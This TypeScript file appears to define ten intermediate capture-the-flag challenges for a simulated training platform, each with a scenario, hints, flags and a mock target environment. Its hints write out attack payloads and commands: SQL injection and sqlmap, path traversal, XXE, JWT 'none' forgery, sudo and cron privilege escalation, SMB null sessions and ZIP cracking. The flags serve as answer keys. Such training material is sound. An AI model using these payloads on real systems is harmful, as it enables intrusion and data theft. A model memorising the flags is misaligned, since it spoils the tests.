import type { CTFChallenge } from "../types";

/* ──────────────────────────────────────────────────────────────
   LEVEL 2 — Intermediate. For those who have learned the basics.
   Multiple stages and chain attacks (chaining).
   ────────────────────────────────────────────────────────────── */

export const LEVEL2: CTFChallenge[] = [
  {
    id: "l2-01-sqli",
    level: 2,
    category: "web",
    title: "Bypass Login",
    summary: "Bypass the login form with SQL injection.",
    scenario:
      "The web application (10.10.20.5) directly inserts user input into an SQL query on the login form. This is a classic SQL injection vulnerability — authentication can be completely bypassed.",
    objectives: [
      "Find the login form",
      "Craft an SQL injection payload",
      "Bypass authentication and get the flag",
    ],
    hints: [
      "Check the /login page and identify the parameters.",
      "Classic bypass: ' OR '1'='1 or admin'-- ",
      "sqlmap -u 'http://10.10.20.5/login' --data 'user=a&pass=a' also works.",
    ],
    targetIp: "10.10.20.5",
    flag: "CYBERAI{sql1_4uth_byp4ss}",
    flagFormat: "CYBERAI{...}",
    points: 180,
    rubric: {
      expectedTools: ["nmap", "curl", "sqlmap"],
      expectedConcepts: ["sql injection", "auth bypass", "input validation"],
      parMinutes: 15,
    },
    env: {
      network: "Web application with MySQL backend.",
      hosts: [
        {
          ip: "10.10.20.5",
          hostname: "portal.corp.local",
          os: "Linux (Ubuntu 22.04)",
          ports: [
            { port: 80, service: "http", version: "Apache 2.4.52", state: "open" },
            { port: 3306, service: "mysql", version: "MySQL 8.0.32", state: "filtered" },
          ],
          web: {
            server: "Apache/2.4.52",
            routes: {
              "/": { status: 200, body: "<html><body><h1>Corp Portal</h1><a href='/login'>Login</a></body></html>" },
              "/login": {
                status: 200,
                protected: true,
                body: "<html><body><h1>Login</h1><form>user, pass. Query: SELECT * FROM users WHERE user='$u' AND pass='$p'</form></body></html>",
              },
              "/dashboard": {
                status: 200,
                body: "<html><body><h1>Dashboard</h1><p>Admin access granted.</p><pre>FLAG: CYBERAI{sql1_4uth_byp4ss}</pre></body></html>",
              },
            },
          },
        },
      ],
    },
  },
  {
    id: "l2-02-lfi",
    level: 2,
    category: "web",
    title: "Path Traversal",
    summary: "Read system files using Local File Inclusion.",
    scenario:
      "The page loads files via the 'page' parameter: ?page=about. Due to lack of filtering, system files can be read using the ../ sequence (LFI / path traversal).",
    objectives: [
      "Find the vulnerable parameter",
      "Read /etc/passwd using path traversal",
      "Get the flag from a hidden config file",
    ],
    hints: [
      "curl 'http://10.10.20.10/?page=about' — normal load.",
      "Try ?page=../../../../etc/passwd.",
      "The app configuration might be in /var/www/config.php.",
    ],
    targetIp: "10.10.20.10",
    flag: "CYBERAI{p4th_tr4v3rs4l_lf1}",
    flagFormat: "CYBERAI{...}",
    points: 180,
    rubric: {
      expectedTools: ["curl", "gobuster"],
      expectedConcepts: ["local file inclusion", "path traversal", "input sanitization"],
      parMinutes: 14,
    },
    env: {
      network: "PHP web application with LFI vulnerability.",
      hosts: [
        {
          ip: "10.10.20.10",
          hostname: "cms.corp.local",
          os: "Linux",
          ports: [{ port: 80, service: "http", version: "Apache 2.4.52 / PHP 8.1", state: "open" }],
          web: {
            server: "Apache/2.4.52",
            routes: {
              "/": { status: 200, body: "<html><body><h1>CMS</h1><a href='/?page=about'>About</a></body></html>" },
              "/?page=about": { status: 200, body: "<html><body><h1>About Us</h1><p>We are a corp.</p></body></html>" },
              "/?page=../../../../etc/passwd": {
                status: 200,
                body: "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nadmin:x:1000:1000::/home/admin:/bin/bash",
              },
              "/?page=../config.php": {
                status: 200,
                body: "<?php\n$db_user='cmsadmin';\n$db_pass='Spr1ng2024!';\n// FLAG: CYBERAI{p4th_tr4v3rs4l_lf1}\n?>",
              },
            },
            discoverablePaths: ["/?page=../config.php"],
          },
        },
      ],
    },
  },
  {
    id: "l2-03-ssh-key",
    level: 2,
    category: "privesc",
    title: "Exposed Key",
    summary: "Access with an exposed SSH private key.",
    scenario:
      "An SSH private key (id_rsa) was exposed from the web server. If the key is not protected with a passphrase, it can be used immediately to connect as a user.",
    objectives: [
      "Find the exposed key",
      "Fix the key permissions (chmod 600)",
      "Connect via SSH and get the flag",
    ],
    hints: [
      "Check the /backup/ directory on the web server (gobuster).",
      "Download id_rsa, then chmod 600 id_rsa.",
      "ssh -i id_rsa svcuser@10.10.20.15.",
    ],
    targetIp: "10.10.20.15",
    flag: "CYBERAI{l34k3d_pr1v4t3_k3y}",
    flagFormat: "CYBERAI{...}",
    points: 190,
    rubric: {
      expectedTools: ["gobuster", "curl", "chmod", "ssh"],
      expectedConcepts: ["key exposure", "ssh key auth", "file permissions"],
      parMinutes: 16,
    },
    env: {
      network: "Web + SSH. Key exposed via web.",
      hosts: [
        {
          ip: "10.10.20.15",
          hostname: "git.corp.local",
          os: "Linux (Debian 11)",
          ports: [
            { port: 22, service: "ssh", version: "OpenSSH 8.4p1", state: "open" },
            { port: 80, service: "http", version: "nginx 1.18.0", state: "open" },
          ],
          credentials: [{ service: "ssh", username: "svcuser", password: "__KEY__" }],
          web: {
            server: "nginx/1.18.0",
            routes: {
              "/": { status: 200, body: "<html><body><h1>Git Server</h1></body></html>" },
              "/backup/": { status: 200, body: "<html><body>Index of /backup/<br><a href='id_rsa'>id_rsa</a></body></html>" },
              "/backup/id_rsa": {
                status: 200,
                body: "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAA...(svcuser key, no passphrase)...\n-----END OPENSSH PRIVATE KEY-----",
              },
            },
            discoverablePaths: ["/backup/", "/backup/id_rsa"],
          },
          fs: {
            "/home/svcuser/user.txt": "CYBERAI{l34k3d_pr1v4t3_k3y}",
          },
        },
      ],
    },
  },
  {
    id: "l2-04-sudo-privesc",
    level: 2,
    category: "privesc",
    title: "Unlimited Privilege",
    summary: "Get root from a misconfigured sudo setting.",
    scenario:
      "You've logged into a shell as a regular user (user/user123). 'sudo -l' may show misconfigured permissions — for example, a binary that can be run without a password could give you root via GTFOBins.",
    objectives: [
      "Connect via SSH",
      "Check privileges with sudo -l",
      "Get root using a GTFOBins technique and read the root flag",
    ],
    hints: [
      "ssh user@10.10.20.20 (password: user123).",
      "sudo -l — which command is passwordless (NOPASSWD)?",
      "If 'find' is available: sudo find . -exec /bin/sh \\; — GTFOBins.",
    ],
    targetIp: "10.10.20.20",
    flag: "CYBERAI{sud0_g7f0b1ns_r00t}",
    flagFormat: "CYBERAI{...}",
    points: 200,
    rubric: {
      expectedTools: ["ssh", "sudo", "find"],
      expectedConcepts: ["privilege escalation", "sudo misconfiguration", "gtfobins"],
      parMinutes: 18,
    },
    env: {
      network: "SSH server. Regular user + misconfigured sudo.",
      hosts: [
        {
          ip: "10.10.20.20",
          hostname: "app02.corp.local",
          os: "Linux (Ubuntu 22.04)",
          ports: [{ port: 22, service: "ssh", version: "OpenSSH 8.9p1", state: "open" }],
          credentials: [{ service: "ssh", username: "user", password: "user123" }],
          fs: {
            "/home/user/user.txt": "User flag — continue for root.",
            "/etc/sudoers.d/user": "user ALL=(root) NOPASSWD: /usr/bin/find",
            "/root/root.txt": "CYBERAI{sud0_g7f0b1ns_r00t}",
          },
          rootFlagPath: "/root/root.txt",
        },
      ],
    },
  },
  {
    id: "l2-05-jwt",
    level: 2,
    category: "web",
    title: "Unsigned Token",
    summary: "Exploit the JWT 'none' algorithm vulnerability.",
    scenario:
      "The API (10.10.20.25) uses JWT for authentication. The server accepts 'alg: none' tokens — this means it doesn't verify the signature. You can become an administrator by changing the role to 'admin'.",
    objectives: [
      "Obtain and decode the JWT token",
      "Change the role to admin in the payload (alg: none)",
      "Get the flag from the admin endpoint",
    ],
    hints: [
      "curl http://10.10.20.25/api/login — get the token.",
      "JWT has 3 parts: header.payload.signature (base64).",
      "Change the header to {alg:none}, payload role to admin, leave the signature empty.",
    ],
    targetIp: "10.10.20.25",
    flag: "CYBERAI{jwt_n0n3_4lg_byp4ss}",
    flagFormat: "CYBERAI{...}",
    points: 210,
    rubric: {
      expectedTools: ["curl", "base64"],
      expectedConcepts: ["jwt", "none algorithm", "token forgery"],
      parMinutes: 18,
    },
    env: {
      network: "REST API with JWT authentication.",
      hosts: [
        {
          ip: "10.10.20.25",
          hostname: "api.corp.local",
          os: "Linux",
          ports: [{ port: 80, service: "http", version: "Express / Node 18", state: "open" }],
          web: {
            server: "Express",
            routes: {
              "/api/login": {
                status: 200,
                body: '{"token":"eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.xxsignaturexx"}',
              },
              "/api/admin": {
                status: 200,
                protected: true,
                body: '{"message":"admin access","flag":"CYBERAI{jwt_n0n3_4lg_byp4ss}"}',
              },
            },
          },
        },
      ],
    },
  },
  {
    id: "l2-06-zip-crack",
    level: 2,
    category: "forensics",
    title: "Locked Archive",
    summary: "Open a password-protected ZIP file.",
    scenario:
      "A password-protected ZIP file containing confidential information was found. If the password is weak, it can be cracked with john (zip2john + dictionary attack).",
    objectives: [
      "Convert the ZIP password to a hash (zip2john)",
      "Crack the password (john)",
      "Extract the archive and read the flag",
    ],
    hints: [
      "ls — secret.zip is in your box.",
      "zip2john secret.zip > zip.hash.",
      "john --wordlist=rockyou.txt zip.hash, then unzip secret.zip.",
    ],
    targetIp: "127.0.0.1",
    flag: "CYBERAI{z1p_cr4ck3d_w1th_j0hn}",
    flagFormat: "CYBERAI{...}",
    points: 170,
    rubric: {
      expectedTools: ["zip2john", "john", "unzip", "cat"],
      expectedConcepts: ["archive cracking", "zip2john", "wordlist attack"],
      parMinutes: 14,
    },
    env: {
      network: "Local archive file.",
      localFiles: {
        "/root/secret.zip": "[PROTECTED ZIP — password: 'dragon' — contains: flag.txt]",
      },
      hosts: [],
    },
  },
  {
    id: "l2-07-smb",
    level: 2,
    category: "network",
    title: "Open Share",
    summary: "Investigate an unprotected SMB share.",
    scenario:
      "A Windows server (10.10.20.30) provides SMB file shares. Some may be open without authentication (null session). This could expose confidential files.",
    objectives: [
      "Identify SMB ports",
      "List shares (smbclient/enum4linux)",
      "Get the flag from a secret share",
    ],
    hints: [
      "nmap -p 139,445 10.10.20.30.",
      "smbclient -L //10.10.20.30 -N (null session).",
      "smbclient //10.10.20.30/private -N, then get flag.txt.",
    ],
    targetIp: "10.10.20.30",
    flag: "CYBERAI{nul1_s3ss10n_smb}",
    flagFormat: "CYBERAI{...}",
    points: 190,
    rubric: {
      expectedTools: ["nmap", "smbclient", "enum4linux"],
      expectedConcepts: ["smb enumeration", "null session", "share access"],
      parMinutes: 16,
    },
    env: {
      network: "Windows SMB file server.",
      hosts: [
        {
          ip: "10.10.20.30",
          hostname: "WIN-FILE01",
          os: "Windows Server 2019",
          ports: [
            { port: 139, service: "netbios-ssn", state: "open" },
            { port: 445, service: "microsoft-ds", version: "Windows SMB", state: "open" },
          ],
          fs: {
            "//private/flag.txt": "CYBERAI{nul1_s3ss10n_smb}",
            "//private/notes.txt": "SMB share access needs to be restricted!",
            "//public/welcome.txt": "Public share.",
          },
        },
      ],
    },
  },
  {
    id: "l2-08-xxe",
    level: 2,
    category: "web",
    title: "External Entity",
    summary: "Read files with XXE injection.",
    scenario:
      "The API (10.10.20.35) accepts XML input. The XML parser hasn't disabled external entities — this allows reading server files via XXE injection.",
    objectives: [
      "Find the endpoint that accepts XML",
      "Create an XXE payload (file:// entity)",
      "Get the flag from a hidden file",
    ],
    hints: [
      "POST /api/parse — Content-Type: application/xml.",
      "Use <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
      "Target file: file:///opt/flag.txt.",
    ],
    targetIp: "10.10.20.35",
    flag: "CYBERAI{xx3_3xt3rn4l_3nt1ty}",
    flagFormat: "CYBERAI{...}",
    points: 210,
    rubric: {
      expectedTools: ["curl"],
      expectedConcepts: ["xxe", "xml entities", "file disclosure"],
      parMinutes: 18,
    },
    env: {
      network: "API that accepts XML.",
      hosts: [
        {
          ip: "10.10.20.35",
          hostname: "soap.corp.local",
          os: "Linux",
          ports: [{ port: 80, service: "http", version: "Java / Tomcat 9", state: "open" }],
          web: {
            server: "Apache-Coyote/1.1",
            routes: {
              "/api/parse": {
                status: 200,
                protected: true,
                body: "Send XML POST. Parser resolves external entities. Target: file:///opt/flag.txt — FLAG: CYBERAI{xx3_3xt3rn4l_3nt1ty}",
              },
            },
          },
          fs: { "/opt/flag.txt": "CYBERAI{xx3_3xt3rn4l_3nt1ty}" },
        },
      ],
    },
  },
  {
    id: "l2-09-stego",
    level: 2,
    category: "stego",
    title: "Secret in the Image",
    summary: "Extract data hidden in an image.",
    scenario:
      "A seemingly innocent PNG image was provided. Steganography is the technique of hiding data inside media files. The hidden payload can be extracted with steghide or binwalk.",
    objectives: [
      "Check the image metadata",
      "Extract the hidden data (steghide/binwalk/strings)",
      "Find the flag",
    ],
    hints: [
      "Try strings image.png | grep CYBERAI.",
      "steghide extract -sf image.png (password may be empty).",
      "Extract embedded files with binwalk -e image.png.",
    ],
    targetIp: "127.0.0.1",
    flag: "CYBERAI{h1dd3n_1n_p1x3ls}",
    flagFormat: "CYBERAI{...}",
    points: 180,
    rubric: {
      expectedTools: ["strings", "steghide", "binwalk", "exiftool"],
      expectedConcepts: ["steganography", "data extraction", "metadata"],
      parMinutes: 15,
    },
    env: {
      network: "Local image file.",
      localFiles: {
        "/root/image.png": "[PNG IMAGE — steghide payload (no pass) -> hidden.txt -> CYBERAI{h1dd3n_1n_p1x3ls}]",
      },
      hosts: [],
    },
  },
  {
    id: "l2-10-cron",
    level: 2,
    category: "privesc",
    title: "Time Bomb",
    summary: "Get root via a writable cron script.",
    scenario:
      "You've logged into a regular user shell (10.10.20.40). A cron job running as root executes a writable script every minute. You can add a malicious command to the script to gain root.",
    objectives: [
      "Connect via SSH",
      "Find cron jobs and the writable script",
      "Modify the script to get the root flag",
    ],
    hints: [
      "ssh maint@10.10.20.40 (password: maint2024).",
      "cat /etc/crontab — view root cron jobs.",
      "If /opt/backup.sh is writable, add the line cp /root/root.txt /tmp/ to it.",
    ],
    targetIp: "10.10.20.40",
    flag: "CYBERAI{cr0n_j0b_h1j4ck}",
    flagFormat: "CYBERAI{...}",
    points: 200,
    rubric: {
      expectedTools: ["ssh", "cat", "echo"],
      expectedConcepts: ["cron jobs", "writable scripts", "privilege escalation"],
      parMinutes: 18,
    },
    env: {
      network: "SSH server. Writable root cron script.",
      hosts: [
        {
          ip: "10.10.20.40",
          hostname: "backup.corp.local",
          os: "Linux (Debian 11)",
          ports: [{ port: 22, service: "ssh", version: "OpenSSH 8.4p1", state: "open" }],
          credentials: [{ service: "ssh", username: "maint", password: "maint2024" }],
          fs: {
            "/etc/crontab": "* * * * * root /opt/backup.sh",
            "/opt/backup.sh": "#!/bin/bash\n# world-writable! (rwxrwxrwx)\ntar -czf /backups/data.tgz /var/www",
            "/root/root.txt": "CYBERAI{cr0n_j0b_h1j4ck}",
          },
          rootFlagPath: "/root/root.txt",
        },
      ],
    },
  },
];
